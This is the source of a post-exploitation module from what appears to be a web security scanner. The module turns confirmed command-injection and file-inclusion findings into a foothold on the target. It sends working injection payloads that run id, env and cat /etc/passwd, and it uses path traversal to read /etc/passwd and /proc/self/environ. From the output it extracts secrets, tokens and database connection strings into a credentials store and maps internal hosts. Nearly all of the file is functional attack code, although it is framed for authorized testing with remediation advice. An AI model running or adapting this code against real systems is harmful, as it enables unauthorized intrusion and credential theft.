import crypto from "node:crypto";
import { db, now } from "../db.js";

const COMMANDS = [
  ["id", "user"],
  ["whoami", "user"],
  ["hostname", "host"],
  ["uname -a", "os"],
  ["ver", "os"],
  ["pwd", "path"],
  ["cd", "path"],
  ["ls -la", "files"],
  ["cat /etc/passwd", "passwd"],
  ["env", "env"],
  ["cat /etc/hosts", "hosts"],
  ["ip addr 2>/dev/null || ifconfig 2>/dev/null", "network"],
  ["ipconfig", "network"],
];

function node(scanId, kind, value, meta = {}) {
  if (!value) return;
  db.prepare(
    "INSERT OR IGNORE INTO system_nodes(id, scan_id, kind, value, meta_json, created_at) VALUES(?, ?, ?, ?, ?, ?)",
  ).run(crypto.randomUUID(), scanId, kind, String(value).slice(0, 2000), JSON.stringify(meta), now());
}

function extract(text, begin, end) {
  const start = text.indexOf(begin);
  const stop = text.indexOf(end);
  if (start < 0 || stop < 0) return "";
  return text.slice(start + begin.length, stop).trim().slice(0, 4000);
}

function fake(out, command) {
  const value = out.trim();
  return value === `; ${command}; echo` || value === `& ${command} & echo` || value.startsWith("; ") || value.startsWith("& ");
}

export default {
  id: "foothold",
  name: "Foothold & Post-Exploitation",
  description: "Safe read-only command and file collection through confirmed RCE/LFI, host mapping and credential extraction.",
  category: "post",
  targetTypes: ["web", "mixed"],
  dynamic: true,
  cost: "high",
  async run(ctx) {
    if (ctx.config.postExploitation === false || !ctx.webUrl) return;
    const findings = db
      .prepare("SELECT * FROM findings WHERE scan_id = ? AND engine = 'exploit' AND rule_id IN ('exploit-rce','exploit-lfi')")
      .all(ctx.scan.id);
    if (!findings.length) {
      ctx.emit("info", "No RCE/LFI foothold to expand");
      return;
    }
    let collected = 0;
    for (const finding of findings) {
      const evidence = JSON.parse(finding.evidence_json || "{}");
      const url = evidence.request?.url;
      if (!url) continue;
      const param = new URL(url).searchParams.keys().next().value;
      if (!param) continue;
      const run = async (payload) => {
        const u = new URL(url);
        u.searchParams.set(param, payload);
        return ctx.scope.fetch(u.toString(), { timeout: 15_000 });
      };
      if (finding.rule_id === "exploit-rce") {
        const outputs = {};
        for (const [command, kind] of COMMANDS.slice(0, Number(ctx.config.maxFootholdCommands || 8))) {
          if (ctx.signal?.aborted) break;
          try {
            let res = await run(`; echo KESTREL_BEGIN; ${command}; echo KESTREL_END`);
            let out = extract(res.text, "KESTREL_BEGIN", "KESTREL_END");
            const amp = await run(`echo x & echo KESTREL_BEGIN & ${command} & echo KESTREL_END`);
            const ampOut = extract(amp.text, "KESTREL_BEGIN", "KESTREL_END");
            ctx.emit("debug", `foothold ${command}: semi=${JSON.stringify(out)} amp=${JSON.stringify(ampOut)}`);
            if (ampOut && (!out || out.trim().startsWith(";") || out.trim() === `; ${command}; echo`)) {
              out = ampOut;
              res = amp;
            }
            if (!out) continue;
            if (fake(out, command)) {
              const alternate = command === "uname -a" ? "ver" : command === "pwd" ? "cd" : null;
              if (alternate) {
                const alt = await run(`echo x & echo KESTREL_BEGIN & ${alternate} & echo KESTREL_END`);
                const altOut = extract(alt.text, "KESTREL_BEGIN", "KESTREL_END");
                if (altOut && !fake(altOut, alternate)) out = altOut;
              }
            }
            if (fake(out, command)) continue;
            outputs[command] = out;
            collected += 1;
            if (kind === "user") node(ctx.scan.id, "user", out.trim().split(/\r?\n/)[0]);
            else if (kind === "host") node(ctx.scan.id, "host", out.trim().split(/\r?\n/)[0]);
            else if (kind === "os") node(ctx.scan.id, "os", out);
            else if (kind === "path") node(ctx.scan.id, "path", out);
            else if (kind === "hosts") {
              for (const line of out.split("\n")) {
                const ip = line.match(/^(\d+\.\d+\.\d+\.\d+)\s+(.+)/);
                if (ip && !/127\.0\.0\.1|::1/.test(ip[1])) node(ctx.scan.id, "internal-host", ip[2].trim(), { ip: ip[1] });
              }
            } else if (kind === "network") {
              for (const ip of out.matchAll(/inet\s+(\d+\.\d+\.\d+\.\d+)/g)) {
                if (!/127\.0\.0\.1/.test(ip[1])) node(ctx.scan.id, "internal-ip", ip[1]);
              }
            } else if (kind === "env") {
              for (const line of out.split("\n")) {
                const m = line.match(/^([A-Z0-9_]*(?:SECRET|TOKEN|PASSWORD|PASS|KEY|DSN|URL)[A-Z0-9_]*)=(.+)$/i);
                if (!m) continue;
                node(ctx.scan.id, "env", `${m[1]}=${m[2].slice(0, 300)}`);
                if (/postgres|mysql|mongodb|redis|amqp/i.test(m[2])) {
                  db.prepare(
                    "INSERT INTO credentials(id, scan_id, kind, username, secret, source, valid, meta_json, created_at) VALUES(?, ?, 'connection-string', ?, ?, 'env', 1, '{}', ?)",
                  ).run(crypto.randomUUID(), ctx.scan.id, m[1], m[2].slice(0, 500), now());
                }
              }
            }
          } catch {
            /* continue */
          }
        }
        if (Object.keys(outputs).length) {
          ctx.add({
            engine: "foothold",
            ruleId: "rce-foothold",
            title: "Foothold established through command injection",
            description: `Read-only commands executed successfully. Collected: ${Object.keys(outputs).join(", ")}.`,
            severity: "critical",
            confidence: "high",
            cwe: "CWE-78",
            owasp: "A03:2021",
            tags: ["foothold", "rce", "post-exploitation", "impact"],
            evidence: { url, param, outputs },
            remediation: "Treat the host as compromised and review persistence, credentials and egress.",
            references: ["https://cwe.mitre.org/data/definitions/78.html"],
            assetValue: url,
            assetKind: "endpoint",
          });
        }
      }
      if (finding.rule_id === "exploit-lfi") {
        const files = ["/etc/passwd", "/etc/hostname", "/proc/self/environ", "/etc/hosts", "C:/Windows/win.ini", "C:/Windows/System32/drivers/etc/hosts"];
        const reads = {};
        for (const file of files) {
          if (ctx.signal?.aborted) break;
          try {
            const payload = file.startsWith("C:") ? file : `../../../../..${file}`;
            const res = await run(payload);
            if (res.status === 200 && res.text.length > 20) {
              reads[file] = res.text.slice(0, 3000);
              collected += 1;
              if (file === "/etc/hostname") node(ctx.scan.id, "host", res.text.trim().split("\n")[0]);
              if (file === "/etc/hosts" || file.endsWith("drivers/etc/hosts")) {
                for (const line of res.text.split("\n")) {
                  const ip = line.match(/^(\d+\.\d+\.\d+\.\d+)\s+(.+)/);
                  if (ip && !/127\.0\.0\.1/.test(ip[1])) node(ctx.scan.id, "internal-host", ip[2].trim(), { ip: ip[1] });
                }
              }
              if (file === "/proc/self/environ") {
                for (const entry of res.text.split("\0")) {
                  const m = entry.match(/^([A-Z0-9_]*(?:SECRET|TOKEN|PASSWORD|KEY|DSN|URL)[A-Z0-9_]*)=(.+)$/i);
                  if (m) node(ctx.scan.id, "env", `${m[1]}=${m[2].slice(0, 300)}`);
                }
              }
            }
          } catch {
            /* continue */
          }
        }
        if (Object.keys(reads).length) {
          ctx.add({
            engine: "foothold",
            ruleId: "lfi-foothold",
            title: "Sensitive files read through LFI",
            description: `Read ${Object.keys(reads).join(", ")} through the confirmed traversal.`,
            severity: "high",
            confidence: "high",
            cwe: "CWE-22",
            owasp: "A01:2021",
            tags: ["foothold", "lfi", "post-exploitation", "credential"],
            evidence: { url, param, files: Object.keys(reads), preview: Object.fromEntries(Object.entries(reads).map(([k, v]) => [k, v.slice(0, 500)])) },
            remediation: "Restrict traversal, move secrets out of world-readable files and rotate exposed credentials.",
            references: ["https://cwe.mitre.org/data/definitions/22.html"],
            assetValue: url,
            assetKind: "endpoint",
          });
        }
      }
    }
    const nodes = db.prepare("SELECT COUNT(*) AS n FROM system_nodes WHERE scan_id = ?").get(ctx.scan.id).n;
    ctx.emit("info", `Foothold collection: ${collected} reads, ${nodes} system nodes`);
  },
};
